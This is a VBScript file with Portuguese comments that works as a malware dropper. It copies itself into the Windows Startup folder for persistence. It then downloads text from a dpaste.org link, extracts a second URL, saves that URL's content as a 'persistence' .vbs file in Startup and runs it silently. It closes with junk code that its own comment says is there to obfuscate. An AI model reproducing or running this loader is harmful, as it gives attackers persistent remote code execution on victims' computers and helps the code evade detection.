
On Error Resume Next
Dim shell, fso, http, temp, scriptPath, startupPath, scriptName
Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
Set http = CreateObject("MSXML2.XMLHTTP")

' Obter caminho do script atual
scriptPath = WScript.ScriptFullName
scriptName = fso.GetFileName(scriptPath)

' Obter pasta Startup
startupPath = shell.SpecialFolders("Startup")

' Auto-cópia para Startup se não estiver lá
If InStr(LCase(scriptPath), LCase(startupPath)) = 0 Then
    Dim newPath
    newPath = startupPath & "\" & scriptName
    If Not fso.FileExists(newPath) Then
        fso.CopyFile scriptPath, newPath, True
    End If
End If

' URL fornecida pelo usuário
Dim userUrl
userUrl = "https://dpaste.org/OfpT6/raw"

' Baixar conteúdo do primeiro link
http.Open "GET", userUrl, False
http.Send

If http.Status = 200 Then
    Dim firstContent, secondUrl
    firstContent = http.responseText
    
    ' Procurar segundo link no conteúdo
    ' Procura por padrões de URL comuns
    Dim regex, matches
    Set regex = CreateObject("VBScript.RegExp")
    regex.Global = True
    regex.IgnoreCase = True
    regex.Pattern = "https?://[^\s<>""']*"
    
    Set matches = regex.Execute(firstContent)
    
    If matches.Count > 0 Then
        ' Pega o primeiro link encontrado (ou você pode implementar lógica para pegar um específico)
        secondUrl = matches(0).Value
        
        ' Criar novo objeto HTTP para o segundo download
        Dim http2
        Set http2 = CreateObject("MSXML2.XMLHTTP")
        
        ' Baixar conteúdo do segundo link
        http2.Open "GET", secondUrl, False
        http2.Send
        
        If http2.Status = 200 Then
            Dim secondContent, vbsFileName, vbsFilePath
            secondContent = http2.responseText
            
            ' Nome do arquivo VBS na pasta Startup
            vbsFileName = "persistence_" & Int(Rnd() * 10000) & ".vbs"
            vbsFilePath = startupPath & "\" & vbsFileName
            
            ' Salvar conteúdo como arquivo VBS
            Dim file
            Set file = fso.CreateTextFile(vbsFilePath, True)
            file.Write secondContent
            file.Close
            
            ' Executar o arquivo VBS baixado
            shell.Run "wscript.exe """ & vbsFilePath & """", 0, False
        End If
    End If
End If

' Código lixo no final para ofuscar
Dim i, j, k, dummy1, dummy2, dummy3
For i = 1 To 10
    dummy1 = i * 2
    dummy2 = dummy1 + 5
    dummy3 = dummy2 * 3
    If dummy3 > 50 Then
        dummy3 = dummy3 - 25
    End If
Next

Dim tempVar1, tempVar2, tempVar3
tempVar1 = "temp_string_1"
tempVar2 = "temp_string_2" 
tempVar3 = tempVar1 & tempVar2

For j = 1 To 5
    k = j + 10
    If k > 12 Then
        k = k - 2
    End If
Next

' Mais código lixo
Dim arrayDummy(10)
For i = 0 To 10
    arrayDummy(i) = i * i
Next

Dim result
result = 0
For i = 0 To 10
    result = result + arrayDummy(i)
Next
